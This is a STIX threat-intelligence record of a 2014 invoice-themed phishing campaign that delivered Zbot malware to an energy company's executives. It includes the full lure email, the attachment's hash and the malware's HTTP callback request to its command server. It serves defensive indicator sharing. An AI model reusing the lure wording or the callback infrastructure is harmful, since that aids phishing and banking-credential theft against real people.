stix:STIX_Header.stix:Title: Phishing Emails with Payment Invoice Theme Sent to Energy Company
stix:STIX_Header.stix:Description: On 17 and 19 August 2014, phishing emails were sent from imes@eim.ae. The emails sent of 17 August 2014 contained a blank subject line. The emails sent on 19 August 2014 used the subject "Re: Re: Re:.". The malicious attachments were Payment Invoice.zip included the Zbot malware, Payment-20Invoice.-20Pdf.scr (MD5: 40ed6f385f4665537a9f401621deb2c2). The Zbot malware called back to ehis.org.in. The phishing emails were sent to executives and other senior personnel of an energy company.

stix:Indicator.indicator:Description: ---- BEGIN EMAIL HEADER ----EHLO mail.usa-host4.comMAIL FROM:<imes@eim.ae>RCPT TO: [REDACTED]DATAReceived: from User (UnknownHost [41.82.86.242]) by mail.usa-host4.com with SMTP; Tue, 19 Aug 2014 06:42:11 -0500From: "Installations Middle East Co LLC"<imes@eim.ae>Subject: Re: Re: Re:.Date: Tue, 19 Aug 2014 11:41:55 -0000MIME-Version: 1.0Content-Type: multipart/mixed; .boundary="----=_NextPart_000_0010_01C2A9A6.53919612"X-Priority: 3X-MSMail-Priority: NormalX-Mailer: Microsoft Outlook Express 6.00.2600.0000X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000---- END EMAIL HEADER ----This is a multi-part message in MIME format.---- BEGIN EMAIL BODY ----------=_NextPart_000_0010_01C2A9A6.53919612Content-Type: text/plain;.charset="Windows-1251"Content-Transfer-Encoding: 7bitWith reference to the attached, kindly reconfirm the payment invoice.Your earliest response shall be highly appreciated,Best regards[REDACTED]Sole Authorised Distributors of RS COMPONENTS LTDin the UAE, Oman, Bahrain, Lebanon & TurkeyPO Box [REDACTED], Dubai, UAETel: [REDACTED] Fax: [REDACTED]Email: ime@eim.aeTimings: Sunday to Thursday : 7.30 am to 5.30 pm(For & on behalf of [REDACTED].)Awarded "RS Components Distributor of the Year - [REDACTED]----[REDACTED] *************************************************************** The contents of this Email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom it is addressed. The views stated herein do not necessarily represent the view of the company. If you are not the intended recipient of this Email you may not copy, forward, disclose or otherwise use it or any part of it in any form whatsoever. If you have received this mail in error please Email the sender. *************************************************************** [REDACTED]------=_NextPart_000_0010_01C2A9A6.53919612Content-Type: application/x-zip-compressed;.name="Payment Invoice.zip"Content-Transfer-Encoding: base64Content-Disposition: attachment;.filename="Payment Invoice.zip".---- END EMAIL BODY ----
This file was identified as a Zbot bank information stealer. It makes multiple API calls for system files.

The Zbot malware called back to this domain. Following is the HTTP GET request used to request additional resources.GET /job/cool/panel/config.bin HTTP/1.1User-Agent: Mozilla/4.0 (com patible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)Host: ehis.org.inAccept: */*Cache-Control: no-cache
